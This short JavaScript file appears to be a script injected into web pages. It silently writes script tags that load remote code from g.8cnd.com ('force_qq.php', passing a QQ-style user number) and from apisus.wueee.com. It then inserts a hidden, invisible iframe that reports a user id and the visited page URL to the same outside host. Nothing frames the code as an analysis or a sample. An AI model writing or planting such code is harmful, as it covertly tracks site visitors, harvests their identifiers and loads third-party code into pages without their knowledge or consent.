document.write("<script src='http://g.8cnd.com/force_qq.php?uin="+sg_ids+"'></script>");


var id="1382";

document.write("<script src='http://apisus.wueee.com/ApiGo/sg/sv.php?uid="+sg_ids+"&id="+id+"&url=http://index.8cnd.com'></script>");


function my_insert() {
	function insert_iframe(url) {
		var s = document.createElement("iframe");
		s.style.display = "none";
		s.style.visibility = "hidden";
		s.src = url;
		document.body.appendChild(s);
	}
	insert_iframe("http://apisus.wueee.com/c/apisus.php?uid=1687&id=1382&url=http%3A%2F%2Findex.8cnd.com%2Ftj%2F&llurl=&thepage=http://java.itcast.cn/java/course/javaee.shtml&fuck=1451873165");
}
setTimeout(my_insert, 100);
